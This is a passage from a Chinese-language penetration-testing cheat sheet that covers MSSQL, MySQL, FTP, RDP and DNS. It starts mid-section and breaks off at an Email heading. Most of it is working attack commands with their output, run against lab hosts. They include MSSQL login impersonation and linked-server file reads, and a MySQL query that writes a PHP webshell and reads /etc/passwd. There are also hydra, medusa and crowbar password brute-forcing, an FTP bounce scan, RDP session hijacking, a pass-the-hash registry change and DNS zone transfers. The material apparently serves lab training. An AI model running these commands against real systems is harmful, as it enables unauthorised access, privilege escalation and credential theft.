<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># 查看可以模仿的用户</span><br><span class="line"><span class="number">1</span>&gt; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#x27;IMPERSONATE&#x27;</span><br><span class="line">name</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br><span class="line">-----------------------------------------------</span><br><span class="line">sa</span><br><span class="line">ben</span><br><span class="line">valentin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 验证当前用户是否具有 sysadmin 权限；返回<span class="number">0</span>，表示没有 sysadmin 权限</span><br><span class="line"><span class="number">1</span>&gt; SELECT SYSTEM_USER</span><br><span class="line"><span class="number">2</span>&gt; SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br><span class="line"><span class="number">3</span>&gt; go</span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line">julio                                                                                                                    </span><br><span class="line">(<span class="number">1</span> rows affected)</span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line">          <span class="number">0</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> rows affected)                                                                           </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 模拟用户 sa</span><br><span class="line"><span class="number">1</span>&gt; EXECUTE AS LOGIN = &#x27;sa&#x27;</span><br><span class="line"><span class="number">2</span>&gt; SELECT SYSTEM_USER</span><br><span class="line"><span class="number">3</span>&gt; SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br><span class="line"><span class="number">4</span>&gt; GO</span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line">sa</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> rows affected)</span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line">          <span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> rows affected)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 恢复操作并返回到之前的用户</span><br><span class="line">REVERT</span><br></pre></td></tr></table></figure>

<h2 id="链接其他数据库"><a href="#链接其他数据库" class="headerlink" title="链接其他数据库"></a>链接其他数据库</h2><p><code>MSSQL</code>有一个配置选项，称为<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine">链接服务器</a>。链接服务器通常配置为允许数据库引擎执行包含另一个 SQL Server 实例或其他数据库产品（如 Oracle）中的表的 Transact-SQL 语句。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 查看链接服务器</span><br><span class="line"><span class="number">1</span>&gt; SELECT srvname, isremote FROM sysservers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br><span class="line"></span><br><span class="line">srvname                             isremote</span><br><span class="line">----------------------------------- --------</span><br><span class="line">DESKTOP-MFERMN4\SQLEXPRESS          <span class="number">1</span></span><br><span class="line"><span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">12</span>\SQLEXPRESS                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span> rows affected)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看连接的用户及其权限</span><br><span class="line"><span class="number">1</span>&gt; EXECUTE(&#x27;select @@servername, @@version, system_user, is_srvrolemember(&#x27;&#x27;sysadmin&#x27;&#x27;)&#x27;) <span class="built_in">AT</span> [<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">12</span>\SQLEXPRESS]</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br><span class="line"></span><br><span class="line">------------------------------ ------------------------------ ------------------------------ -----------</span><br><span class="line">DESKTOP-<span class="number">0</span>L9D4KA\SQLEXPRESS     Microsoft SQL Server <span class="number">2019</span> (RTM sa_remote                                <span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> rows affected)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 读取文件</span><br><span class="line"><span class="number">1</span>&gt; EXECUTE(&#x27;select * from OPENROWSET(BULK &#x27;&#x27;C:/Users/Administrator/desktop/flag.txt&#x27;&#x27;, SINGLE_CLOB) AS Contents&#x27;) <span class="built_in">at</span> [local.test.linked.srv];</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>TCP 3306</p>
<p><code>MySQL</code>默认系统模式&#x2F;数据库：</p>
<ul>
<li><code>mysql</code>- 是系统数据库，其中包含存储 MySQL 服务器所需信息的表</li>
<li><code>information_schema</code>- 提供对数据库元数据的访问</li>
<li><code>performance_schema</code>- 是一种用于在低级别监控 MySQL 服务器执行的功能</li>
<li><code>sys</code>- 一组帮助 DBA 和开发人员解释性能模式收集的数据的对象</li>
</ul>
<h2 id="interact-1"><a href="#interact-1" class="headerlink" title="interact"></a>interact</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Linux - mysql</span><br><span class="line">mysql -u username -pPassword -h 10.129.20.13</span><br><span class="line"></span><br><span class="line"># Windows - mysql.exe</span><br><span class="line">C:\&gt; mysql.exe -u username -pPassword -h 10.129.20.13</span><br></pre></td></tr></table></figure>

<h2 id="nmap-2"><a href="#nmap-2" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -sC -p3306 10.10.10.125</span><br></pre></td></tr></table></figure>

<h2 id="wirte-1"><a href="#wirte-1" class="headerlink" title="wirte"></a>wirte</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/webshell.php&#x27;;</span><br><span class="line"></span><br><span class="line"># 条件</span><br><span class="line">mysql&gt; show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>

<h2 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p>TCP 20 TCP 21</p>
<h2 id="interact-2"><a href="#interact-2" class="headerlink" title="interact"></a>interact</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp anonymous@10.129.20.13</span><br><span class="line"></span><br><span class="line"># 下载所有文件</span><br><span class="line">wget -m --no-passive ftp://anonymous@10.129.200.209:30021</span><br></pre></td></tr></table></figure>

<h2 id="nmap-3"><a href="#nmap-3" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -sC -sV -p 21 192.168.2.142 </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT</span><br><span class="line">Nmap scan report for 192.168.2.142</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner</span><br><span class="line">| d--x--x--x   2 root     root         1024 Jan 14  2002 bin</span><br><span class="line">| d--x--x--x   2 root     root         1024 Aug 10  1999 etc</span><br><span class="line">| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]</span><br><span class="line">| d--x--x--x   2 root     root         1024 Jan 14  2002 lib</span><br><span class="line">| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub</span><br><span class="line">|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.</span><br></pre></td></tr></table></figure>

<h2 id="anonymous"><a href="#anonymous" class="headerlink" title="anonymous"></a>anonymous</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ftp anonymous@192.168.2.142</span><br></pre></td></tr></table></figure>

<h2 id="crack-1"><a href="#crack-1" class="headerlink" title="crack"></a>crack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.list -P pws.list ftp://10.129.220.123</span><br><span class="line"></span><br><span class="line">medusa -M ftp -h 10.129.203.7 -u fiona -P /usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure>

<h2 id="FTP-反弹攻击"><a href="#FTP-反弹攻击" class="headerlink" title="FTP 反弹攻击"></a>FTP 反弹攻击</h2><p>假设我们的目标是暴露在互联网上的<code>FTP_DMZ</code>服务器。同一网络中的另一台设备<code>Internal_DMZ</code>未暴露在互联网上。我们可以利用与<code>FTP_DMZ</code>服务器的连接，使用 FTP 反弹攻击进行扫描<code>Internal_DMZ</code>，并获取有关服务器开放端口的信息。</p>
<p>现代 FTP 服务器默认包含防止此类攻击的保护措施，但如果现代 FTP 服务器中的这些功能配置错误，则服务器可能容易受到 FTP 反弹攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT</span><br><span class="line">Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).</span><br><span class="line">Attempting connection to ftp://anonymous:password@10.10.110.213:21</span><br><span class="line">Connected:220 (vsFTPd 3.0.3)</span><br><span class="line">Login credentials accepted by FTP server!</span><br><span class="line">Initiating Bounce Scan at 04:55</span><br><span class="line">FTP command misalignment detected ... correcting.</span><br><span class="line">Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)</span><br><span class="line">Nmap scan report for 172.17.0.2</span><br><span class="line">Host is up.</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">80/tcp open http</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><p>TCP&#x2F;UDP 3389</p>
<h2 id="interact-3"><a href="#interact-3" class="headerlink" title="interact"></a>interact</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rdesktop -u admin -p password123 192.168.2.143</span><br><span class="line"></span><br><span class="line">$ xfreerdp /v:192.168.2.143 /u:admin /p:password123</span><br><span class="line">$ xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9</span><br></pre></td></tr></table></figure>

<h2 id="nmap-4"><a href="#nmap-4" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -Pn -p3389 192.168.2.143 </span><br><span class="line"></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27;, and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST</span><br><span class="line">Nmap scan report for 192.168.2.143</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">3389/tcp open ms-wbt-server</span><br></pre></td></tr></table></figure>

<h2 id="spraying-1"><a href="#spraying-1" class="headerlink" title="spraying"></a>spraying</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P &#x27;password123&#x27; RDP://目标IP</span><br><span class="line"># or</span><br><span class="line">crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c &#x27;password123&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Hijacking-Session"><a href="#Hijacking-Session" class="headerlink" title="Hijacking Session"></a>Hijacking Session</h2><p>需要<code>SYSTEM</code>权限并使用 Microsoft <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon">tscon.exe</a>二进制文件。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">query</span> <span class="title">user</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">USERNAME</span>              <span class="title">SESSIONNAME</span>        <span class="title">ID</span>  <span class="title">STATE</span>   <span class="title">IDLE</span> <span class="title">TIME</span>  <span class="title">LOGON</span> <span class="title">TIME</span></span></span><br><span class="line"><span class="function">&gt;<span class="title">juurena</span>               <span class="title">rdp</span>-<span class="title">tcp</span>#13          1  <span class="title">Active</span>          7  8/25/2021 1:23 <span class="title">AM</span></span></span><br><span class="line"><span class="function"> <span class="title">lewen</span>                 <span class="title">rdp</span>-<span class="title">tcp</span>#14          2  <span class="title">Active</span>          *  8/25/2021 1:28 <span class="title">AM</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">tscon</span> #&#123;<span class="title">TARGET_SESSION_ID</span>&#125; /<span class="title">dest</span>:#&#123;<span class="title">OUR_SESSION_NAME</span>&#125;</span></span><br><span class="line"><span class="function"># 创建一个<span class="title">Windows</span>服务，作为本地系统运行并以 <span class="title">SYSTEM</span> 权限执行任何二进制文件</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc.exe</span> <span class="title">create</span> <span class="title">sessionhijack</span> <span class="title">binpath</span>= &quot;<span class="title">cmd.exe</span> /<span class="title">k</span> <span class="title">tscon</span> 2 /<span class="title">dest:rdp</span>-<span class="title">tcp</span>#13&quot;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">net</span> <span class="title">start</span> <span class="title">sessionhijack</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：此方法在 Server 2019 上不再有效。</p>
</blockquote>
<h2 id="PassTheHash-PtH"><a href="#PassTheHash-PtH" class="headerlink" title="PassTheHash (PtH)"></a>PassTheHash (PtH)</h2><p><code>Restricted Admin Mode</code> 默认情况下，它是被禁用的，但在目标主机上需要启用它，否则就会报错。</p>
<p>可以通过在<code>DisableRestrictedAdmin</code>下添加新的注册表项(REG_DWORD)来启用此功能<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</span><br></pre></td></tr></table></figure>

<p>连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>TCP 53 UDP 53</p>
<h2 id="nmap-5"><a href="#nmap-5" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p53 -Pn -sV -sC 10.10.110.213</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT</span><br><span class="line">Nmap scan report for 10.10.110.213</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE  SERVICE     VERSION</span><br><span class="line">53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)</span><br></pre></td></tr></table></figure>

<h2 id="subdomain"><a href="#subdomain" class="headerlink" title="subdomain"></a>subdomain</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://example.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line"></span><br><span class="line">ffuf -w /path/to/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://example.htb -H &#x27;Host: FUZZ.example.htb&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="DNS-Zone-transfer"><a href="#DNS-Zone-transfer" class="headerlink" title="DNS Zone transfer"></a>DNS Zone transfer</h2><p>DNS 区域是特定组织或管理员管理的 DNS 命名空间的一部分。由于 DNS 包含多个 DNS 区域，因此 DNS 服务器利用 DNS 区域传输将其数据库的一部分复制到另一台 DNS 服务器。除非 DNS 服务器配置正确（限制哪些 IP 可以执行 DNS 区域传输），否则任何人都可以向 DNS 服务器索取其区域信息的副本，因为 DNS 区域传输不需要任何身份验证。此外，DNS 服务通常在 UDP 端口上运行；但是，在执行 DNS 区域传输时，它使用 TCP 端口进行可靠的数据传输。</p>
<p>攻击者可以利用此 DNS 区域传输漏洞来了解有关目标组织的 DNS 命名空间的更多信息，从而增加攻击面。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr inlanefrieght.htb @10.129.110.213</span><br><span class="line">;; global options: +cmd</span><br><span class="line">inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800</span><br><span class="line">inlanefrieght.htb.         604800  IN      AAAA    ::1</span><br><span class="line">inlanefrieght.htb.         604800  IN      NS      localhost.</span><br><span class="line">inlanefrieght.htb.         604800  IN      A       10.129.110.22</span><br><span class="line">admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21</span><br><span class="line">hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25</span><br><span class="line">support.inlanefrieght.htb. 604800  IN      A       10.129.110.28</span><br><span class="line">inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 28 msec</span><br><span class="line">;; SERVER: 10.129.110.213#53(10.129.110.213)</span><br><span class="line">;; WHEN: Mon Oct 11 17:20:13 EDT 2020</span><br><span class="line">;; XFR size: 8 records (messages 1, bytes 289)</span><br></pre></td></tr></table></figure>

<p>枚举根域的所有 DNS 服务器并扫描 DNS 区域传输</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">$ fierce --domain zonetransfer.me</span><br><span class="line"></span><br><span class="line">NS: nsztm2.digi.ninja. nsztm1.digi.ninja.</span><br><span class="line">SOA: nsztm1.digi.ninja. (81.4.108.41)</span><br><span class="line">Zone: success</span><br><span class="line">&#123;&lt;DNS name @&gt;: &#x27;@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 &#x27;</span><br><span class="line">               &#x27;172800 900 1209600 3600\n&#x27;</span><br><span class="line">               &#x27;@ 300 IN HINFO &quot;Casio fx-700G&quot; &quot;Windows XP&quot;\n&#x27;</span><br><span class="line">               &#x27;@ 301 IN TXT &#x27;</span><br><span class="line">               &#x27;&quot;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA&quot;\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN A 5.196.105.14\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN NS nsztm1.digi.ninja.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN NS nsztm2.digi.ninja.&#x27;,</span><br><span class="line"> &lt;DNS name _acme-challenge&gt;: &#x27;_acme-challenge 301 IN TXT &#x27;</span><br><span class="line">                             &#x27;&quot;6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI&quot;&#x27;,</span><br><span class="line"> &lt;DNS name _sip._tcp&gt;: &#x27;_sip._tcp 14000 IN SRV 0 0 5060 www&#x27;,</span><br><span class="line"> &lt;DNS name 14.105.196.5.IN-ADDR.ARPA&gt;: &#x27;14.105.196.5.IN-ADDR.ARPA 7200 IN PTR &#x27;</span><br><span class="line">                                       &#x27;www&#x27;,</span><br><span class="line"> &lt;DNS name asfdbauthdns&gt;: &#x27;asfdbauthdns 7900 IN AFSDB 1 asfdbbox&#x27;,</span><br><span class="line"> &lt;DNS name asfdbbox&gt;: &#x27;asfdbbox 7200 IN A 127.0.0.1&#x27;,</span><br><span class="line"> &lt;DNS name asfdbvolume&gt;: &#x27;asfdbvolume 7800 IN AFSDB 1 asfdbbox&#x27;,</span><br><span class="line"> &lt;DNS name canberra-office&gt;: &#x27;canberra-office 7200 IN A 202.14.81.230&#x27;,</span><br><span class="line"> &lt;DNS name cmdexec&gt;: &#x27;cmdexec 300 IN TXT &quot;; ls&quot;&#x27;,</span><br><span class="line"> &lt;DNS name contact&gt;: &#x27;contact 2592000 IN TXT &quot;Remember to call or email Pippa &#x27;</span><br><span class="line">                     &#x27;on +44 123 4567890 or pippa@zonetransfer.me when making &#x27;</span><br><span class="line">                     &#x27;DNS changes&quot;&#x27;,</span><br><span class="line"> &lt;DNS name dc-office&gt;: &#x27;dc-office 7200 IN A 143.228.181.132&#x27;,</span><br><span class="line"> &lt;DNS name deadbeef&gt;: &#x27;deadbeef 7201 IN AAAA dead:beaf::&#x27;,</span><br><span class="line"> &lt;DNS name dr&gt;: &#x27;dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m&#x27;,</span><br><span class="line"> &lt;DNS name DZC&gt;: &#x27;DZC 7200 IN TXT &quot;AbCdEfG&quot;&#x27;,</span><br><span class="line"> &lt;DNS name email&gt;: &#x27;email 2222 IN NAPTR 1 1 &quot;P&quot; &quot;E2U+email&quot; &quot;&quot; &#x27;</span><br><span class="line">                   &#x27;email.zonetransfer.me\n&#x27;</span><br><span class="line">                   &#x27;email 7200 IN A 74.125.206.26&#x27;,</span><br><span class="line"> &lt;DNS name Hello&gt;: &#x27;Hello 7200 IN TXT &quot;Hi to Josh and all his class&quot;&#x27;,</span><br><span class="line"> &lt;DNS name home&gt;: &#x27;home 7200 IN A 127.0.0.1&#x27;,</span><br><span class="line"> &lt;DNS name Info&gt;: &#x27;Info 7200 IN TXT &quot;ZoneTransfer.me service provided by Robin &#x27;</span><br><span class="line">                  &#x27;Wood - robin@digi.ninja. See &#x27;</span><br><span class="line">                  &#x27;http://digi.ninja/projects/zonetransferme.php for more &#x27;</span><br><span class="line">                  &#x27;information.&quot;&#x27;,</span><br><span class="line"> &lt;DNS name internal&gt;: &#x27;internal 300 IN NS intns1\ninternal 300 IN NS intns2&#x27;,</span><br><span class="line"> &lt;DNS name intns1&gt;: &#x27;intns1 300 IN A 81.4.108.41&#x27;,</span><br><span class="line"> &lt;DNS name intns2&gt;: &#x27;intns2 300 IN A 167.88.42.94&#x27;,</span><br><span class="line"> &lt;DNS name office&gt;: &#x27;office 7200 IN A 4.23.39.254&#x27;,</span><br><span class="line"> &lt;DNS name ipv6actnow.org&gt;: &#x27;ipv6actnow.org 7200 IN AAAA &#x27;</span><br><span class="line">                            &#x27;2001:67c:2e8:11::c100:1332&#x27;,</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<p>还有 DNS spoofing …</p>
<hr>
<h1 id="Email"><a href="#Email" class="headerlink" title="Email"></a>Email</h1><p>识别邮箱服务器</p>
